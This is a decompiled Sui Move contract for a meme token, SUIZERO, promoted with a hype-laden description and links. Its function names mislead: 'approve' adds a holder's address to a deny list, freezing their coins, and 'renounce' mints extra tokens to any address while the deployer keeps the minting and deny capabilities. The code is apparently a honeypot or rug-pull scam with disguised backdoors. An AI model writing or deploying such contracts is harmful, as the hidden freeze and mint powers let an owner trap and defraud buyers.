module 0xf6afd980c8b0ca4940a118eaa9e0cf288e51c83488979bae07cb4d1801b7dffb::suizero {
    struct SUIZERO has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIZERO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUIZERO>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIZERO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUIZERO>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SUIZERO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUIZERO>(arg0, 2, b"SUIZERO", b"SUIZERO", b"TEST YOUR MIGHT - SUIZERO IS THE NEW HYPE ON SUI - https://suizero.xyz/ https://t.me/suizero/ - ", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suizero.xyz/suizero.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUIZERO>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<SUIZERO>(&mut v3, 100000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SUIZERO>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUIZERO>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<SUIZERO>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<SUIZERO>(arg0, 1000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

